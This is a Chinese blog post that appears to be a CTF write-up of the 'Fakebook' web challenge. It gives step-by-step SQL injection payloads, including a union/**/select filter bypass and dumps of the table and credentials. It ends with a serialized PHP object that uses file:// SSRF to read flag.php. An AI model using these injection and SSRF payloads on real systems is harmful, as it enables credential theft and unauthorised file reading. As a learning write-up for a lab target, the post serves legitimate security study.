---
title: '[网鼎杯 2018]Fakebook'
author: Troy3e
avatar: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg
authorLink: 
authorAbout: 一个好奇的人
authorDesc: 一个好奇的人
categories: 技术
comments: true
date: 2020-07-04 21:34:29
tags: ssrf漏洞
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-196720.jpg
---
万万没想到robots.txt里面居然有东西，一开始一直以为漏洞在注册和登录之中，也没有用dir去扫。。。
源码：
![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200704232149.png)
在注册的帐号的主界面存在注入点：
![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200704231304.png)
![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200704231339.png)
字段数为4：no=1 order by 4--+
union select被过滤了，新学习了一种绕过的方法：union/**/select

注入点为2：no=1 union/**/select 1,2,3,4--+

数据库为fakebook：no=0 union/**/select 1,database(),3,4--+

表为users：no=0 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='fakebook'--+

列为no,username,passwd,data：no=0%20union/**/select%201,group_concat(column_name),3,4 from information_schema.columns where table_schema='fakebook' and table_name='users'--+

查出数据：no=0%20union/**/select%201,group_concat(no,'-',username,'-',passwd,'-',data),3,4 from fakebook.users --+
![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200704231929.png)

很明显data是一串序列化的代码，还原后得到：
![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/2016410-20200507215325049-962043420.png)
发现：这个正是源码中的UserInfo类
接下来再看之前找到的源码，这里有一个新的知识点：ssrf漏洞。
SSRF,也就是Server Side RequestForgery—服务器端请求伪造。从字面上来看，与CSRF不同的是，它是服务器端发出的请求伪造而非从用户一端提交。别误会，作为受信任用户，服务器当然不可能做出损害用户信息的事。它是一种由攻击者构造形成，由服务端发起请求的一个安全漏洞。因为它是由服务端发起的，所以它能够请求到与它相连但与外网隔离的内部系统。
一般由curl的滥用引起。
更多关于ssrf漏洞的介绍详见：https://www.jianshu.com/p/d1d1c40f6d4c
说一下我自己的理解：
首先这个ssrf漏洞具体是如何判断出来的我暂且不去搞的非常明白，目前先记住看到curl就要联想到ssrf就行。在判断这里存在了ssrf漏洞之后，就要想办法去利用它进行flag的读取。
回到一开始的界面：
![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200704231304.png)
可以看到name、age、blog等信息，此时再看data那里反序列化后的结果，所有的信息都被藏在了data列里，猜测服务器是通过查询data字段,得到其中的序列化信息来渲染整个页面,从而恰好得到页面中的username,age,blog值。在猜想到这个逻辑之后，我们就可以通过修改查询的序列化对象的值来构造ssrf请求,从而读取到flag文件。
利用flie协议读取文件：
![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200705000447.png)
最终payload：http://9ccd5c5c-9dea-4d09-87ab-06ac06819869.node3.buuoj.cn/view.php?no=0%20union/**/select%201,2,3,%27O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:0;s:4:"blog";s:29:"file:///var/www/html/flag.php";}%27%20from%20users%20--+

查看页面源代码，访问界面即可

最后：这道题是一道综合性很强的题，用到了ssrf、反序列化、sql注入，难度还是比较大的。但是写的很乱，不知道能不能让读者理解我的意思。


参考链接：
1、https://blog.csdn.net/qq_44657899/article/details/104884553
1、https://www.cnblogs.com/hello-there/p/12846239.html
